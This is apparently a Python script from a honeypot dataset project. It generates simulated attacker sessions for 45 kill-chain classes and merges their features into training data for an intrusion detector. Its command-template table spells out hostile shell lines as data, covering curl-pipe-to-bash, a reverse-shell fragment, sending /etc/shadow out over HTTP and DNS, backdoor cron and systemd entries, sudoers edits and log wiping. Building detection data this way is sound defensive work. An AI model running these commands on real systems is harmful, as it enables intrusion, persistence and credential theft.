"""
src/generators/fill_missing_classes.py
Generate simulated sessions for micro-state classes absent from real data,
extract 128 features, and merge with X_real.npy to produce a complete
training set covering all 45 classes.

Usage:
    cd honeypot_dataset
    python -m src.generators.fill_missing_classes
"""
from __future__ import annotations
import sys, random, logging
import numpy as np
import pandas as pd
from pathlib import Path
from tqdm.auto import tqdm

ROOT = Path(__file__).resolve().parent.parent.parent
sys.path.insert(0, str(ROOT))

from configs.schema import (
    MICRO_STATES, LABEL_TO_IDX, IDX_TO_LABEL, IDX_TO_PHASE,
    KILL_CHAIN_DAG, N_CLASSES, FEAT_NAMES,
)
from src.generators.kill_chain_simulator import generate_session_sequence
from src.extractors.temporal import extract_temporal
from src.extractors.network import extract_network
from src.extractors.payload import extract_payload
from src.extractors.tls_host import extract_tls_host

logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")
log = logging.getLogger(__name__)

DATA_PROC = ROOT / "data" / "processed"

# ── Command templates per micro-state ────────────────────────────────────────
# Realistic shell snippets so payload + semantic extractors produce meaningful
# features that vary across classes.
_CMD_TEMPLATES: dict[str, list[str]] = {
    # Phase 0: Reconnaissance
    "RECON_DNS":            ["nslookup {target}", "dig {target} ANY", "host -a {target}"],
    "RECON_IP_SCAN":        ["nmap -sS -T4 {target}", "masscan -p1-65535 {target}", "zmap -p 22 {target}/24"],
    "RECON_VERSION_PROBE":  ["nmap -sV -p22,80,443 {target}", "curl -sI http://{target}", "nc -zv {target} 22"],
    "RECON_OS_DETECT":      ["nmap -O {target}", "p0f -i eth0", "xprobe2 {target}"],
    "RECON_VULN_SCAN":      ["nmap --script vuln {target}", "nikto -h {target}", "nuclei -u http://{target}"],
    "RECON_USER_ENUM":      ["enum4linux -a {target}", "finger @{target}", "smtp-user-enum -M VRFY -U users.txt -t {target}"],
    # Phase 1: Initial Access
    "ACCESS_BRUTE_SSH":     ["hydra -l root -P rockyou.txt ssh://{target}", "medusa -h {target} -u admin -P pass.txt -M ssh"],
    "ACCESS_BRUTE_HTTP":    ["hydra -l admin -P pass.txt http-post-form://{target}", "wfuzz -c -z file,pass.txt --hs Invalid http://{target}/login"],
    "ACCESS_CRED_STUFF":    ["python3 cred_stuff.py --target {target} --combo combo.txt", "crackmapexec ssh {target} -u users.txt -p leaked.txt"],
    "ACCESS_DEFAULT_CRED":  ["ssh root@{target}", "mysql -h {target} -u root -p root", "curl http://{target}/admin"],
    "ACCESS_KEX_EXPLOIT":   ["python3 exploit_kex.py --rhost {target}", "ssh -o KexAlgorithms=diffie-hellman-group1-sha1 {target}"],
    "ACCESS_AUTH_BYPASS":   ["curl http://{target}/..;/admin", "sqlmap -u http://{target}/login --forms --batch"],
    # Phase 2: Execution
    "EXEC_SHELL_OPEN":      ["bash -i", "/bin/sh", "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"],
    "EXEC_PYTHON_SCRIPT":   ["python3 -c 'import os; os.system(\"id\")'", "python3 /tmp/payload.py", "pip install reverse_shell"],
    "EXEC_PERL_SCRIPT":     ["perl -e 'use Socket;$i=\"{target}\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"))'"],
    "EXEC_CURL_BASH":       ["curl http://{target}/shell.sh | bash", "wget -qO- http://{target}/payload.sh | sh"],
    "EXEC_WGET_EXEC":       ["wget http://{target}/bot -O /tmp/bot && chmod +x /tmp/bot && /tmp/bot"],
    "EXEC_MEMFD_EXEC":      ["python3 -c 'import ctypes; fd=ctypes.CDLL(None).memfd_create(b\"a\",1)'"],
    # Phase 3: Discovery
    "DISC_ENV_PROBE":       ["uname -a && cat /etc/passwd && id && whoami", "env && printenv && cat /proc/version"],
    "DISC_NETSTAT_SCAN":    ["netstat -tlnp", "ss -tulpn", "ip addr show && arp -a"],
    "DISC_PROC_ENUM":       ["ps aux", "top -bn1 | head -20", "cat /proc/cpuinfo && free -m"],
    "DISC_SUID_HUNT":       ["find / -perm -4000 -type f 2>/dev/null", "find / -user root -perm -u=s 2>/dev/null"],
    "DISC_CVE_SEARCH":      ["searchsploit kernel 5.4", "curl -s https://exploit-db.com/search?q=ubuntu", "nmap --script vulscan {target}"],
    # Phase 4: Privilege Escalation
    "PRIVESC_SUDO_ABUSE":   ["sudo -l && sudo su", "sudo /usr/bin/find / -exec /bin/sh \\;", "echo 'root ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers"],
    "PRIVESC_SUID_EXPLOIT": ["./suid_binary --exec /bin/sh", "/usr/bin/pkexec /bin/bash", "cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash"],
    "PRIVESC_KERNEL_XPLOIT":["gcc /tmp/dirty_cow.c -o /tmp/dc -lpthread && /tmp/dc", "wget http://{target}/CVE-2021-4034 -O /tmp/pwnkit && chmod +x /tmp/pwnkit && /tmp/pwnkit"],
    "PRIVESC_CONTAINER_ESC":["mount /dev/sda1 /mnt && chroot /mnt", "nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash"],
    # Phase 5: Persistence
    "PERSIST_CRONTAB":      ["(crontab -l; echo '* * * * * /tmp/backdoor') | crontab -", "echo '*/5 * * * * curl http://{target}/beacon' >> /var/spool/cron/root"],
    "PERSIST_BASHRC":       ["echo 'nohup /tmp/shell &' >> ~/.bashrc", "echo '/tmp/backdoor &' >> /etc/profile"],
    "PERSIST_SSH_KEY_ADD":  ["echo 'ssh-rsa AAAA...' >> ~/.ssh/authorized_keys", "mkdir -p /root/.ssh && echo 'ssh-ed25519 ...' > /root/.ssh/authorized_keys"],
    "PERSIST_BACKDOOR_ADD": ["cp /bin/bash /usr/local/bin/.hidden_shell && chmod u+s /usr/local/bin/.hidden_shell"],
    "PERSIST_SYSTEMD_SVC":  ["cat > /etc/systemd/system/backdoor.service << EOF\n[Service]\nExecStart=/tmp/shell\nEOF\nsystemctl enable backdoor"],
    # Phase 6: Defense Evasion
    "EVASION_LOG_WIPE":     ["echo '' > /var/log/auth.log && echo '' > /var/log/syslog", "shred -zu /var/log/wtmp /var/log/btmp"],
    "EVASION_HIST_ERASE":   ["unset HISTFILE && history -c", "export HISTSIZE=0 && rm -f ~/.bash_history"],
    "EVASION_CHMOD_HIDE":   ["mv /tmp/bot /usr/lib/.libsystem.so", "chmod 000 /tmp/payload && chattr +i /tmp/payload"],
    "EVASION_CURL_OBFUS":   ["curl -s http://{target}/payload | base64 -d | bash", "python3 -c \"exec(__import__('base64').b64decode(b'aW1wb3J0IG9z'))\""],
    "EVASION_PROC_INJECT":  ["gdb -p $(pgrep sshd) -ex 'call system(\"/tmp/shell &\")'", "python3 -c 'import ctypes; ctypes.CDLL(None).ptrace(16,1234,0,0)'"],
    # Phase 7: Lateral Movement
    "LATERAL_SSH_SPREAD":   ["ssh -o StrictHostKeyChecking=no user@10.0.0.{n}", "for h in $(cat /tmp/hosts); do sshpass -p pass ssh root@$h '/tmp/worm'; done"],
    "LATERAL_SCAN_PIVOT":   ["nmap -sn 10.0.0.0/24", "arp -a && ping -c1 10.0.0.1"],
    "LATERAL_CRED_REUSE":   ["sshpass -p 'P@ssw0rd' ssh admin@10.0.0.{n}", "crackmapexec ssh 10.0.0.0/24 -u admin -p 'password123'"],
    # Phase 8: Exfiltration
    "EXFIL_SCP_DATA":       ["scp /etc/shadow attacker@{target}:/loot/", "rsync -avz /home/ attacker@{target}:/exfil/"],
    "EXFIL_CURL_C2":        ["curl -X POST -d @/etc/passwd http://{target}/collect", "wget --post-file=/etc/shadow http://{target}/exfil"],
    "EXFIL_DNS_TUNNEL":     ["cat /etc/shadow | xxd -p | while read line; do nslookup $line.{target}; done"],
    "EXFIL_STAGING_TAR":    ["tar czf /tmp/.data.tar.gz /etc/ /home/ && curl -F 'file=@/tmp/.data.tar.gz' http://{target}/upload"],
    "EXFIL_TUNNEL_NGROK":   ["./ngrok tcp 4444 &", "chisel client {target}:8080 R:4444:127.0.0.1:22"],
}

# Protocol / port mapping per phase
_PHASE_PROFILES = {
    0: {"ports": [22, 80, 443, 8080], "protocols": ["tcp", "ssh", "http"]},
    1: {"ports": [22, 80, 443, 3306], "protocols": ["ssh", "http", "tcp"]},
    2: {"ports": [22], "protocols": ["ssh"]},
    3: {"ports": [22], "protocols": ["ssh"]},
    4: {"ports": [22], "protocols": ["ssh"]},
    5: {"ports": [22], "protocols": ["ssh"]},
    6: {"ports": [22], "protocols": ["ssh"]},
    7: {"ports": [22, 2222], "protocols": ["ssh"]},
    8: {"ports": [22, 80, 443, 53], "protocols": ["ssh", "tcp", "http"]},
}

_COUNTRIES = ["CN", "RU", "US", "DE", "BR", "IN", "NL", "RO", "UA", "KP", "IR", "GB"]
_CVE_POOL = [
    "CVE-2023-44487", "CVE-2024-3400", "CVE-2023-20198",
    "CVE-2023-46805", "CVE-2024-21762", "CVE-2021-4034",
    "CVE-2021-44228", "CVE-2023-0386",
]


def _build_session_dict(label: str, rng: random.Random, np_rng: np.random.Generator) -> dict:
    """Build a session dict with all keys the extractors need."""
    idx   = LABEL_TO_IDX[label]
    phase = IDX_TO_PHASE[idx]
    prof  = _PHASE_PROFILES[phase]

    # Timing
    t_start = float(np_rng.uniform(1_680_000_000, 1_712_400_000))
    dur     = float(np_rng.lognormal(mean=3.5 + phase * 0.4, sigma=1.2))
    n_ev    = max(1, int(np_rng.lognormal(mean=2.5 + phase * 0.3, sigma=1.0)))

    # Generate plausible event timestamps
    timestamps = sorted(t_start + np_rng.exponential(dur / max(n_ev, 1), size=n_ev).cumsum())
    timestamps = [t_start] + list(timestamps[:n_ev - 1])

    n_login = 0
    if "BRUTE" in label or "CRED" in label:
        n_login = max(1, int(np_rng.lognormal(mean=3.5, sigma=1.0)))
    n_cmds = max(0, n_ev - n_login - 1)

    dst_port = rng.choice(prof["ports"])
    protocol = rng.choice(prof["protocols"])

    # Command text
    target_ip = f"10.{rng.randint(0,255)}.{rng.randint(0,255)}.{rng.randint(1,254)}"
    templates = _CMD_TEMPLATES.get(label, ["echo unknown"])
    cmd_text  = rng.choice(templates).format(target=target_ip, n=rng.randint(1, 254))
    if n_cmds > 1:
        extras = [rng.choice(templates).format(target=target_ip, n=rng.randint(1, 254))
                  for _ in range(min(n_cmds - 1, 4))]
        cmd_text = " && ".join([cmd_text] + extras)

    # Network volumes scale with phase
    bytes_in  = int(np_rng.lognormal(6.0 + phase * 0.5, 1.5))
    bytes_out = int(np_rng.lognormal(5.5 + phase * 0.3, 1.5))

    # CVE association for phases 4+
    cve = ""
    if phase >= 4 and rng.random() < 0.4:
        cve = rng.choice(_CVE_POOL)

    country = rng.choice(_COUNTRIES)

    return {
        "session_id":        f"sim_{label}_{rng.randint(0, 99999999):08d}",
        "micro_state":       label,
        "micro_state_sequence": label,
        "source":            "simulated",
        "session_duration_s": dur,
        "t_start":           t_start,
        "t_end":             t_start + dur,
        "n_events":          n_ev,
        "n_commands":        n_cmds,
        "login_attempts":    n_login,
        "event_timestamps":  timestamps,
        "bytes_in":          bytes_in,
        "bytes_out":         bytes_out,
        "dst_port":          dst_port,
        "src_port":          rng.randint(49152, 65535),
        "protocol":          protocol,
        "tcp_flags":         rng.choice(["SYN", "SYN,ACK", "ACK", "SYN,ACK,FIN", ""]),
        "command_text":      cmd_text,
        "associated_cve":    cve,
        "src_country":       country,
        "seen_before":       rng.random() < 0.3,
        "ja3_hash":          "",
        "cipher_suites":     [],
        "tls_version":       rng.choice(["TLSv1.2", "TLSv1.3"]),
        "sni_hostname":      "",
        "unique_dst_ports":  rng.randint(1, 5),
    }


def generate_and_extract(
    samples_per_missing_class: int = 5000,
    seed: int = 42,
) -> tuple[np.ndarray, np.ndarray, pd.DataFrame]:
    """
    Generate sessions for missing classes, extract 128 features.
    Returns (X_sim, y_sim, df_meta).
    """
    # Load existing labels to find missing classes
    y_real = np.load(DATA_PROC / "y_real.npy")
    existing_classes = set(np.unique(y_real).astype(int))
    all_classes = set(range(N_CLASSES))
    missing_classes = sorted(all_classes - existing_classes)

    log.info("Existing classes: %d, Missing classes: %d", len(existing_classes), len(missing_classes))
    log.info("Missing: %s", [IDX_TO_LABEL[c] for c in missing_classes])

    if not missing_classes:
        log.info("All 45 classes present — nothing to fill.")
        return np.empty((0, 128)), np.empty(0), pd.DataFrame()

    rng    = random.Random(seed)
    np_rng = np.random.default_rng(seed)
    total  = len(missing_classes) * samples_per_missing_class

    X_sim = np.zeros((total, 128), dtype=np.float32)
    y_sim = np.zeros(total, dtype=np.int64)
    meta_rows = []

    log.info("Generating %d sessions across %d missing classes (%d per class)...",
             total, len(missing_classes), samples_per_missing_class)

    idx = 0
    for cls_id in missing_classes:
        label = IDX_TO_LABEL[cls_id]
        for _ in tqdm(range(samples_per_missing_class), desc=f"  {label}", leave=False):
            sess = _build_session_dict(label, rng, np_rng)

            # Extract features (groups A, B, C, F — no API calls)
            X_sim[idx, 0:24]   = extract_temporal(sess)
            X_sim[idx, 24:52]  = extract_network(sess)
            X_sim[idx, 52:76]  = extract_payload(sess)
            # Group D (76:106) filled below via batch DistilBERT
            # Group E (106:120) — use zeros (no live API calls for simulated data)
            X_sim[idx, 106:120] = 0.0
            X_sim[idx, 120:128] = extract_tls_host(sess)

            y_sim[idx] = cls_id
            meta_rows.append({
                "session_id":   sess["session_id"],
                "micro_state":  label,
                "source":       "simulated",
                "command_text": sess["command_text"],
            })
            idx += 1

    # Group D: batch DistilBERT + PCA
    log.info("Encoding %d command texts with DistilBERT...", total)
    from src.extractors.semantic import extract_semantic_batch
    pca_path = DATA_PROC / "semantic_pca.pkl"
    texts = [m["command_text"] for m in meta_rows]
    sem30 = extract_semantic_batch(texts, pca_path=pca_path)
    X_sim[:, 76:106] = sem30

    X_sim = np.nan_to_num(X_sim, nan=0.0, posinf=1e4, neginf=-1e4)

    df_meta = pd.DataFrame(meta_rows)
    log.info("Simulated feature matrix: %s, %d classes", X_sim.shape, len(missing_classes))

    return X_sim, y_sim, df_meta


def merge_and_save():
    """Merge simulated data with real data and save combined arrays."""
    X_real = np.load(DATA_PROC / "X_real.npy")
    y_real = np.load(DATA_PROC / "y_real.npy")
    log.info("Real data: X=%s, classes=%d", X_real.shape, len(np.unique(y_real)))

    X_sim, y_sim, df_meta = generate_and_extract()

    if len(X_sim) == 0:
        log.info("Nothing to merge.")
        return

    # Combine
    X_combined = np.concatenate([X_real, X_sim], axis=0)
    y_combined = np.concatenate([y_real, y_sim], axis=0)

    # Shuffle
    perm = np.random.default_rng(42).permutation(len(X_combined))
    X_combined = X_combined[perm]
    y_combined = y_combined[perm]

    log.info("Combined: X=%s, classes=%d/%d",
             X_combined.shape, len(np.unique(y_combined)), N_CLASSES)

    # Verify all 45 present
    unique_cls = set(np.unique(y_combined).astype(int))
    assert unique_cls == set(range(N_CLASSES)), \
        f"Still missing classes: {set(range(N_CLASSES)) - unique_cls}"

    # Save (overwrite X_real / y_real with the combined version)
    np.save(DATA_PROC / "X_real.npy", X_combined)
    np.save(DATA_PROC / "y_real.npy", y_combined)
    df_meta.to_parquet(DATA_PROC / "sim_meta.parquet", index=False)

    log.info("Saved combined X_real.npy %s and y_real.npy %s", X_combined.shape, y_combined.shape)

    # Print class distribution
    u, c = np.unique(y_combined, return_counts=True)
    log.info("Class distribution:")
    for cls_id, cnt in zip(u, c):
        log.info("  [%2d] %-30s %6d", cls_id, IDX_TO_LABEL[int(cls_id)], cnt)


if __name__ == "__main__":
    merge_and_save()
